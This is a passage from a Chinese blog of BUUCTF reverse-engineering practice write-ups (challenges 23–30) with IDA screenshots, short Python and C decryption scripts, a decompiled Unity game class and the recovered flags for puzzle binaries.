class="number">9</span>) + a2[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">    v4 += (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v3;</span><br><span class="line">  result = v4;</span><br><span class="line">  a1[<span class="number">1</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//其实就是对flag[6]进行逐位加密，flag是int 64类型的，所以是64位</span></span><br></pre></td></tr></table></figure>

<p>解密：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a1[<span class="number">6</span>] = &#123; <span class="number">3746099070</span>,<span class="number">550153460</span>,<span class="number">3774025685</span>,<span class="number">1548802262</span>,<span class="number">2652626477</span>,<span class="number">2230518816</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a2[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v4;</span><br><span class="line">    <span class="keyword">int</span> v5;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = a1[j];</span><br><span class="line">        v4 = a1[j + <span class="number">1</span>];</span><br><span class="line">        v5 = <span class="number">1166789954</span> * <span class="number">64</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v4 -= (v3 + v5 + <span class="number">20</span>) ^ ((v3 &lt;&lt; <span class="number">6</span>) + a2[<span class="number">2</span>]) ^ ((v3 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">3</span>]) ^ <span class="number">0x10</span>;</span><br><span class="line">            v3 -= (v4 + v5 + <span class="number">11</span>) ^ ((v4 &lt;&lt; <span class="number">6</span>) + *a2) ^ ((v4 &gt;&gt; <span class="number">9</span>) + a2[<span class="number">1</span>]) ^ <span class="number">0x20</span>;</span><br><span class="line">            v5 -= <span class="number">1166789954</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a1[j] = v3;</span><br><span class="line">        a1[j + <span class="number">1</span>] = v4;</span><br><span class="line">    &#125;<span class="comment">//小端序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>, *((<span class="keyword">char</span>*)&amp;a1[i] + <span class="number">2</span>), *((<span class="keyword">char</span>*)&amp;a1[i] + <span class="number">1</span>), *(<span class="keyword">char</span>*)&amp;a1[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{re_is_great!}</p>
<h1 id="24-WUSTCTF2020-Cr0ssfun"><a href="#24-WUSTCTF2020-Cr0ssfun" class="headerlink" title="24.[WUSTCTF2020]Cr0ssfun"></a>24.[WUSTCTF2020]Cr0ssfun</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003501387.png" alt="image-20230615003501387"></p>
<p>打开ida，来到main函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003648554.png" alt="image-20230615003648554"></p>
<p>进入一下check函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003701438.png" alt="image-20230615003701438"></p>
<p>接着跟进</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003726503.png" alt="image-20230615003726503"></p>
<p>接着跟进</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003846719.png" alt="image-20230615003846719"></p>
<p>继续</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003902252.png" alt="image-20230615003902252"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003911956.png" alt="image-20230615003911956"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003918848.png" alt="image-20230615003918848"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003926603.png" alt="image-20230615003926603"></p>
<p>终于是到finally了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230615003940756.png" alt="image-20230615003940756"></p>
<p>整理一下a1数组，这里没有对flag进行加密，就是简单的判断，所以a1就是flag</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">119</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">50</span>,<span class="number">48</span>,<span class="number">123</span>,<span class="number">99</span>,<span class="number">112</span>,<span class="number">112</span>,<span class="number">95</span>,<span class="number">64</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">114</span>,<span class="number">51</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">64</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">125</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{cpp_@nd_r3verse_@re_fun}</p>
<h1 id="25-FlareOn6-Overlong"><a href="#25-FlareOn6-Overlong" class="headerlink" title="25.[FlareOn6]Overlong"></a>25.[FlareOn6]Overlong</h1><p>The secret of this next challenge is cleverly hidden. However, with the right approach, finding the solution will not take an <b>overlong</b> amount of time.</p>
<p>提示告诉我们，关键信息被巧妙的隐藏了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616014342294.png" alt="image-20230616014342294"></p>
<p>打开ida，主函数如下：</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616014512533.png" alt="image-20230616014512533"></p>
<p>unk_402088</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616014829171.png" alt="image-20230616014829171"></p>
<p>是个很长的字符串</p>
<p>跟进sub_401160函数，只传入了28的长度</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616014543791.png" alt="image-20230616014543791"></p>
<p>接着跟进</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616014610287.png" alt="image-20230616014610287"></p>
<p>这里有点像base64编码，但是整个程序没有输入，也没有进行对比，加上提示</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015154325.png" alt="image-20230616015154325"></p>
<p>应该是这句话后面部分没有显示出来，找一下关键的代码</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015303242.png" alt="image-20230616015303242"></p>
<p>看起来似乎把这个28改长一点就能显示后面的内容</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015433891.png" alt="image-20230616015433891"></p>
<p>地址在004011C9</p>
<p>打开x32dbg，本想直接跳转到push 1Ch的地方，但是貌似不行</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015557754.png" alt="image-20230616015557754"></p>
<p>但是这个主函数很短，一下就看到了push 1Ch。</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015635128.png" alt="image-20230616015635128"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015720050.png" alt="image-20230616015720050"></p>
<p>改大一点，单步运行一下看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015755989.png" alt="image-20230616015755989"></p>
<p>flag出现了</p>
<p>flag{<a href="mailto:&#x49;&#x5f;&#97;&#95;&#77;&#x5f;&#x74;&#x5f;&#x68;&#95;&#101;&#x5f;&#x65;&#95;&#110;&#95;&#67;&#x5f;&#x6f;&#x5f;&#68;&#95;&#105;&#x5f;&#x6e;&#95;&#x67;&#64;&#102;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#x6e;&#46;&#99;&#111;&#109;">&#x49;&#x5f;&#97;&#95;&#77;&#x5f;&#x74;&#x5f;&#x68;&#95;&#101;&#x5f;&#x65;&#95;&#110;&#95;&#67;&#x5f;&#x6f;&#x5f;&#68;&#95;&#105;&#x5f;&#x6e;&#95;&#x67;&#64;&#102;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#x6e;&#46;&#99;&#111;&#109;</a>}</p>
<h1 id="26-UTCTF2020-basic-re"><a href="#26-UTCTF2020-basic-re" class="headerlink" title="26.[UTCTF2020]basic-re"></a>26.[UTCTF2020]basic-re</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230616015955236.png" alt="image-20230616015955236"></p>
<p>打开ida，查看字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702163249296.png" alt="image-20230702163249296"></p>
<p>进入关键函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702163345817.png" alt="image-20230702163345817"></p>
<p>可以看到这里就是先输入+-*/，然后再输入两个数进行操作</p>
<p>回到视图表</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702163807196-16882870875481.png" alt="image-20230702163807196"></p>
<p>这里好像，并没有对flag做什么改变，直接提交一下试试看吧</p>
<p>flag{str1ngs_1s_y0ur_fr13nd}</p>
<p>竟然对了。。。。。</p>
<h1 id="27-FlareOn3-Challenge1"><a href="#27-FlareOn3-Challenge1" class="headerlink" title="27.[FlareOn3]Challenge1"></a>27.[FlareOn3]Challenge1</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702164040835.png" alt="image-20230702164040835"></p>
<p>打开ida，进入main函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702164233261.png" alt="image-20230702164233261"></p>
<p>逻辑很简单，输入flag，加密，sub_401260应该是flag的加密，跟进看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702164441363-16882874817083.png" alt="image-20230702164441363"></p>
<p>很像base64，但是好像不太一样，看看加密表</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702165002072.png" alt="image-20230702165002072"></p>
<p>加密表应该换成ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span>   <span class="comment"># 欲解密的字符串</span></span><br><span class="line">outtab  = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">#  原生字母表</span></span><br><span class="line">intab   = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span>  <span class="comment">#  换表之后的字母表</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(<span class="built_in">str</span>.translate(<span class="built_in">str</span>.maketrans(intab,outtab))))</span><br></pre></td></tr></table></figure>

<p><a href="mailto:&#115;&#104;&#x30;&#48;&#x74;&#105;&#110;&#103;&#x5f;&#112;&#x68;&#x69;&#x73;&#x68;&#95;&#105;&#x6e;&#95;&#97;&#95;&#x62;&#x61;&#114;&#x72;&#101;&#x6c;&#x40;&#102;&#108;&#97;&#x72;&#101;&#45;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;">&#115;&#104;&#x30;&#48;&#x74;&#105;&#110;&#103;&#x5f;&#112;&#x68;&#x69;&#x73;&#x68;&#95;&#105;&#x6e;&#95;&#97;&#95;&#x62;&#x61;&#114;&#x72;&#101;&#x6c;&#x40;&#102;&#108;&#97;&#x72;&#101;&#45;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;</a></p>
<h1 id="28-ACTF新生赛2020-Oruga"><a href="#28-ACTF新生赛2020-Oruga" class="headerlink" title="28.[ACTF新生赛2020]Oruga"></a>28.[ACTF新生赛2020]Oruga</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702171138883.png" alt="image-20230702171138883"></p>
<p>打开ida，进入main函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702171854783.png" alt="image-20230702171854783"></p>
<p>跟进sub_78A()</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702173227171.png" alt="image-20230702173227171"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702173521242.png" alt="image-20230702173521242"></p>
<p>byte_201020数据如下</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702173808166.png" alt="image-20230702173808166"></p>
<p>这样一看，里面的while循环里的while循环的条件就是byte_201020里面数为0的</p>
<p>要让第一层while循环终止，就要走到！，所以有点像迷宫，是个16*16的迷宫</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702175133650.png" alt="image-20230702175133650"></p>
<p>可以在16进制看到迷宫图，终点是21h</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702175652072.png" alt="image-20230702175652072"></p>
<p>就是不要走出边界，然后走到21h就行</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702175737847-16882918585095.png" alt="image-20230702175737847"></p>
<p>往右是E，往左是J，往上是W，往下是M</p>
<p>值得一提的是，由于下图的while循环，往下会一直走到头</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702180156304.png" alt="image-20230702180156304"></p>
<p>所以就是MEWEMEWJMEWJM</p>
<h1 id="29-特殊的-BASE64"><a href="#29-特殊的-BASE64" class="headerlink" title="29.特殊的 BASE64"></a>29.特殊的 BASE64</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702180428203.png" alt="image-20230702180428203"></p>
<p>打开ida，查看字符串信息</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702180524335.png" alt="image-20230702180524335"></p>
<p>进入关键函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702182725455.png" alt="image-20230702182725455"></p>
<p>就是输入然后base64加密与v7判断,换表</p>
<p>AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==&quot;</span>   <span class="comment"># 欲解密的字符串</span></span><br><span class="line">outtab  = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>  <span class="comment">#  原生字母表</span></span><br><span class="line">intab   = <span class="string">&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+&quot;</span>  <span class="comment">#  换表之后的字母表</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(<span class="built_in">str</span>.translate(<span class="built_in">str</span>.maketrans(intab,outtab))))</span><br></pre></td></tr></table></figure>

<p>flag{Special_Base64_By_Lich}</p>
<h1 id="30-BJDCTF2020-BJD-hamburger-competition"><a href="#30-BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="30.[BJDCTF2020]BJD hamburger competition"></a>30.[BJDCTF2020]BJD hamburger competition</h1><p>这是个…..小游戏？</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703010441627.png" alt="image-20230703010441627"></p>
<p>很离谱，第一次碰到这种题，只能先搜寻一下了</p>
<p>.net工具需要使用dnSpy来进行分析</p>
<p>根据大佬的博客，要将BJD hamburger competition_Data<br>\Managed文件夹中的Assembly-CSharp.dll拖到dnSpy进行分析</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703012949166.png" alt="image-20230703012949166"></p>
<p>这里可以看到有许多类，md5，sha1之类的</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703013040573.png" alt="image-20230703013040573"></p>
<p>这里又可以看到应该是游戏里按钮的实现方法，像eat和menu这些应该没什么好分析的，这个通关猜测是将组合组对，所以要找到判断组合的地方</p>
<p>这里一个个找，在ButtonSpawnFruit里找到了加密的地方</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703013415992.png" alt="image-20230703013415992"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Text;</span><br><span class="line">using UnityEngine;</span><br><span class="line"></span><br><span class="line">// Token: 0x02000004 RID: 4</span><br><span class="line">public class ButtonSpawnFruit : MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">	// Token: 0x0600000A RID: 10 RVA: 0x00002110 File Offset: 0x00000310</span><br><span class="line">	public static string Md5(string str)</span><br><span class="line">	&#123;</span><br><span class="line">		byte[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line">		byte[] array = MD5.Create().ComputeHash(bytes);</span><br><span class="line">		StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">		foreach (byte b in array)</span><br><span class="line">		&#123;</span><br><span class="line">			stringBuilder.Append(b.ToString(&quot;X2&quot;));</span><br><span class="line">		&#125;</span><br><span class="line">		return stringBuilder.ToString().Substring(0, 20);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Token: 0x0600000B RID: 11 RVA: 0x00002170 File Offset: 0x00000370</span><br><span class="line">	public static string Sha1(string str)</span><br><span class="line">	&#123;</span><br><span class="line">		byte[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line">		byte[] array = SHA1.Create().ComputeHash(bytes);</span><br><span class="line">		StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">		foreach (byte b in array)</span><br><span class="line">		&#123;</span><br><span class="line">			stringBuilder.Append(b.ToString(&quot;X2&quot;));</span><br><span class="line">		&#125;</span><br><span class="line">		return stringBuilder.ToString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Token: 0x0600000C RID: 12 RVA: 0x000021C8 File Offset: 0x000003C8</span><br><span class="line">	public void Spawn()</span><br><span class="line">	&#123;</span><br><span class="line">		FruitSpawner component = GameObject.FindWithTag(&quot;GameController&quot;).GetComponent&lt;FruitSpawner&gt;();</span><br><span class="line">		if (component)</span><br><span class="line">		&#123;</span><br><span class="line">			if (this.audioSources.Length != 0)</span><br><span class="line">			&#123;</span><br><span class="line">				this.audioSources[Random.Range(0, this.audioSources.Length)].Play();</span><br><span class="line">			&#125;</span><br><span class="line">			component.Spawn(this.toSpawn);</span><br><span class="line">			string name = this.toSpawn.name;</span><br><span class="line">			if (name == &quot;汉堡底&quot; &amp;&amp; Init.spawnCount == 0)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret += 997;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;鸭屁股&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret -= 127;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;胡罗贝&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret *= 3;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;臭豆腐&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret ^= 18;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;俘虏&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret += 29;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;白拆&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret -= 47;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;美汁汁&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret *= 5;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;柠檬&quot;)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret ^= 87;</span><br><span class="line">			&#125;</span><br><span class="line">			else if (name == &quot;汉堡顶&quot; &amp;&amp; Init.spawnCount == 5)</span><br><span class="line">			&#123;</span><br><span class="line">				Init.secret ^= 127;</span><br><span class="line">				string str = Init.secret.ToString();</span><br><span class="line">				if (ButtonSpawnFruit.Sha1(str) == &quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;)</span><br><span class="line">				&#123;</span><br><span class="line">					this.result = &quot;BJDCTF&#123;&quot; + ButtonSpawnFruit.Md5(str) + &quot;&#125;&quot;;</span><br><span class="line">					Debug.Log(this.result);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			Init.spawnCount++;</span><br><span class="line">			Debug.Log(Init.secret);</span><br><span class="line">			Debug.Log(Init.spawnCount);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Token: 0x04000005 RID: 5</span><br><span class="line">	public GameObject toSpawn;</span><br><span class="line"></span><br><span class="line">	// Token: 0x04000006 RID: 6</span><br><span class="line">	public int spawnCount = 1;</span><br><span class="line"></span><br><span class="line">	// Token: 0x04000007 RID: 7</span><br><span class="line">	public AudioSource[] audioSources;</span><br><span class="line"></span><br><span class="line">	// Token: 0x04000008 RID: 8</span><br><span class="line">	public string result = &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703013514929.png" alt="image-20230703013514929"></p>
<p>这里就是判断了</p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p>先把sha1进行解密</p>
<p><a target="_blank" rel="noopener" href="http://www.ttmd5.com/hash.php?type=5">sha1在线解密 在线加密 (ttmd5.com)</a></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703014529012.png" alt="image-20230703014529012"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703014607671.png" alt="image-20230703014607671"></p>
<p>然后又对解密出来的值进行md5加密</p>
<p><a target="_blank" rel="noopener" href="https://md5jiami.bmcx.com/">MD5在线加密 - MD5加密工具 - MD5在线生成 (bmcx.com)</a></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703014728614.png" alt="image-20230703014728614"></p>
<p>这里有四种，看看代码中的md5加密是哪一种</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230703014824196.png" alt="image-20230703014824196"></p>
